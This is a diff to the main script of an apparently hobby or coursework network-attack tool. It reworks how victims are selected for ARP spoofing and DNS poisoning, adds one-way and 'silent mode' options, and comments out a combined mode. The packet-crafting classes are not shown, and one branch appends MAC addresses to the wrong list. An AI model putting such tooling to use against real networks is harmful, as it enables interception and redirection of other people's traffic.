@@ -12,7 +12,13 @@ if __name__ == "__main__":
     interface = "enp0s3"
     arpSpoof = None
     dnsPoison = None
-    hostToAttack = []
+    target1 = []
+    target1MAC = []
+    target2 = []
+    target2MAC = []
+    urlList = []
+    oneWay = None
+    silent = None
     hostToSpoof = None
     ipToSendTo = None
     url = None
@@ -36,61 +42,85 @@ if __name__ == "__main__":
             counter += 1
         index = ""
         while index != "no":
-            index = raw_input("Enter the index of the ip you want to add to be attack IPs or no if you are done adding IPs. ")
+            index = raw_input("Enter the index of the IP to add to Target 1 or no if you are done adding IPs. ")
             if index != "no":
                 intIndex = int(index)
-                hostToAttack.append(ipList[intIndex])
+                target1.append(ipList[intIndex])
+                target1MAC.append(macList[intIndex])
                 index = raw_input("IP added, do you want to select more IP addresses? Write yes or no. ")
 
     if modeOfAttack == "arp":
-        nextOneAttack = raw_input("Do you want to manually add IP address to the to be attack IPs? Type yes or no ")
-        while nextOneAttack == "yes":
-            attackIp = raw_input("Please enter ip address to attack: ")
-            nextOneAttack = raw_input("If you want to enter another IP address to attack type yes, otherwise type no. ")
-            hostToAttack.append(attackIp)
-        spoofIp = raw_input("Please enter ip address to spoof: ")
-        hostToSpoof = spoofIp
+        index2 = ""
+        while index2 != "no":
+            index2 = raw_input("Enter the index of the IP to add to Target 2 or no if you are done adding IPs. ")
+            if index2 != "no":
+                intIndex2 = int(index2)
+                target2.append(ipList[intIndex2])
+                target2.append(macList[intIndex2])
+                index2 = raw_input("IP added, do you want to select more IP addresses? Write yes or no. ")
+        oneWayQuestion = raw_input("Only poison one-way? Write yes or no. ")
+        if oneWayQuestion == "yes":
+            oneWay = True
+        elif oneWayQuestion == "no":
+            oneWay = False
+        silentQuestion = raw_input("Perform attack in silent mode? Write yes or no. ")
+        if silentQuestion == "yes":
+            silent = True
+        elif silentQuestion == "no":
+            silent = False
     elif modeOfAttack == "dns":
-        nextOneAttack = raw_input("Do you want to manually add IP address to the to be attack IPs? Type yes or no ")
-        while nextOneAttack == "yes":
-            attackIp = raw_input("Please enter ip address to attack: ")
-            nextOneAttack = raw_input("If you want to enter another IP address to attack type yes, otherwise type no. ")
-            hostToAttack.append(attackIp)
-        ipSendTo = raw_input("Please enter ip address to which the URL must go to: ")
+        index2 = ""
+        while index2 != "no":
+            index2 = raw_input("Enter the index of the IP to add to Target 2 or no if you are done adding IPs. ")
+            if index2 != "no":
+                intIndex2 = int(index2)
+                target2.append(ipList[intIndex2])
+                target2.append(macList[intIndex2])
+                index2 = raw_input("IP added, do you want to select more IP addresses? Write yes or no. ")
+        ipSendTo = raw_input("Please enter IP address to which the URL must go to: ")
         ipToSendTo = ipSendTo
         urlNext = "yes"
         while urlNext == "yes":
             newUrl = raw_input("Please enter the URL you want to DNS spoof: ")
-            urlNext = raw_input("If you want to enter another URL to DNS spoof type yes, otherwise type no. ")
-            hostToAttack.append(newUrl)
-    elif modeOfAttack == "all":
-        nextOneAttack = raw_input("Do you want to manually add IP address to the to be attack IPs? Type yes or no ")
-        while nextOneAttack == "yes":
-            attackIp = raw_input("Please enter ip address to attack: ")
-            nextOneAttack = raw_input("If you want to enter another IP address to attack type yes, otherwise type no. ")
-            hostToAttack.append(attackIp)
-        spoofIp = raw_input("Please enter ip address to spoof: ")
-        hostToSpoof = spoofIp
-        ipSendTo = raw_input("Please enter ip address to which the URL must go to: ")
-        ipToSendTo = ipSendTo
-        urlNext = "yes"
-        while urlNext == "yes":
-            newUrl = raw_input("Please enter the URL you want to DNS spoof: ")
-            urlNext = raw_input("If you want to enter another URL to DNS spoof type yes, otherwise type no. ")
-            hostToAttack.append(newUrl)
+            urlNext = raw_input("If you want to enter another URL type yes, otherwise type no. ")
+            urlList.append(newUrl)
+        silentQuestion = raw_input("Perform attack in silent mode? Write yes or no. ")
+        if silentQuestion == "yes":
+            silent = True
+        elif silentQuestion == "no":
+            silent = False
+    #elif modeOfAttack == "all":
+    #    index2 = ""
+    #    while index2 != "no":
+    #        index2 = raw_input("Enter the index of the IP to add to Target 2 or no if you are done adding IPs. ")
+    #        if index2 != "no":
+    #            intIndex2 = int(index2)
+    #            target2.append(intIndex2)
+    #            index2 = raw_input("IP added, do you want to select more IP addresses? Write yes or no. ")
+    #    ipSendTo = raw_input("Please enter ip address to which the URL must go to: ")
+    #    ipToSendTo = ipSendTo
+    #    urlNext = "yes"
+    #    while urlNext == "yes":
+    #        newUrl = raw_input("Please enter the URL you want to DNS spoof: ")
+    #        urlNext = raw_input("If you want to enter another URL to DNS spoof type yes, otherwise type no. ")
+    #        urlList.append(newUrl)
     else:
-        print("Wrong mode of attack provided choose out of: arp, dns or all")
+        print("Wrong mode of attack provided choose out of: arp or dns")
         sys.exit(1)
 
-    if len(hostToAttack) == 0:
-        print("You did not add any IP addresses to attack, exiting...")
+    if len(target1) == 0:
+        print("You did not add any IP addresses to Target 1, exiting...")
+        sys.exit(1)
+
+    if len(target2) == 0:
+        print("You did not add any IP addresses to Target 2, exiting...")
         sys.exit(1)
 
     if modeOfAttack == "arp":
         arpSpoofing = ArpSpoofing(interface)
         try:
             print("before thread")
-            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(hostToAttack, hostToSpoof, timeSleep))
+            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(target1, target2, target1MAC, target2MAC, oneWay, silent, timeSleep))
             arpSpoof.daemon = True
             arpSpoof.start()
             print("after thread")
@@ -99,25 +129,25 @@ if __name__ == "__main__":
     elif modeOfAttack == "dns":
         dnsPoisoning = DnsPoisoning(interface)
         try:
-            dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison, args=(hostToAttack, url, ipToSendTo, timeSleep))
+            dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison, args=(target1, target2, target1MAC, target2MAC, urlList, silent, timeSleep))
             dnsPoison.daemon = True
             dnsPoison.start()
         except:
             print("Thread dns failed to start")
 
-    elif modeOfAttack == "all":
-        arpSpoofing = ArpSpoofing(interface)
-        dnsPoisoning = DnsPoisoning(interface)
-        try:
-            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(hostToAttack, hostToSpoof, timeSleep))
-            arpSpoof.daemon = True
-            arpSpoof.start()
-            print("one thread created")
-            dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison, args=(hostToAttack, url, ipToSendTo, timeSleep))
-            dnsPoison.daemon = True
-            dnsPoison.start()
-        except:
-            print("Thread arp & dns failed to start")
+    #elif modeOfAttack == "all":
+    #    arpSpoofing = ArpSpoofing(interface)
+    #    dnsPoisoning = DnsPoisoning(interface)
+    #    try:
+    #        arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(target1, hostToSpoof, timeSleep))
+    #        arpSpoof.daemon = True
+    #        arpSpoof.start()
+    #        print("one thread created")
+    #        dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison, args=(target1, url, ipToSendTo, timeSleep))
+    #        dnsPoison.daemon = True
+    #        dnsPoison.start()
+    #    except:
+    #        print("Thread arp & dns failed to start")
 
     else:
         print("Wrong mode of attack provided choose out of: arp, dns or all")
@@ -127,8 +157,8 @@ if __name__ == "__main__":
         arpSpoof.join()
     elif modeOfAttack == "dns":
         dnsPoison.join()
-    elif modeOfAttack == "all":
-        arpSpoof.join()
-        dnsPoison.join()
+    #elif modeOfAttack == "all":
+    #    arpSpoof.join()
+    #    dnsPoison.join()
 
     print("reached end of the main file")
